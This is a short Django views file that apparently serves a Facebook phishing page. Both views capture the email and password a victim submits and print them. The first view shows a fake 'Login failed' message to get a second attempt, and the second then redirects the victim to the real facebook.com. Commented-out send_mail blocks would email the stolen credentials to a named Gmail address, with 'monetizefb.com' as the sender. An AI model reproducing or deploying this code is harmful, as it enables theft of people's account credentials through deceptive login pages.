from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.contrib import messages


# Create your views here.
def home(request):
	if request.method == "POST":
		email = request.POST['email']
		password = request.POST['password']
		print(email, password)
		# send_mail(
		# 	'New Email Here',
		# 	'Email is: '+email 'and Password is: '+password,
		# 	'monetizefb.com',
		# 	['tdkingzict@gmail.com'],
		# 	fail_silently=False,
		# )
		messages.error(request, 'Login failed, Please check your informations and try again')
		return redirect('base:homeagain')

		
	return render(request, 'index.html', {})


def homeagain(request):
	if request.method == "POST":
		email = request.POST['email']
		password = request.POST['password']
		print(email, password)
		# send_mail(
		# 	'New Email Received',
		# 	'Email is: '+email 'and Password is: '+password,
		# 	'monetizefb.com',
		# 	['tdkingzict@gmail.com'],
		# 	fail_silently=False,
		# )
		url = 'https://facebook.com'
		return redirect(url)

		
	return render(request, 'homeagain.html', {})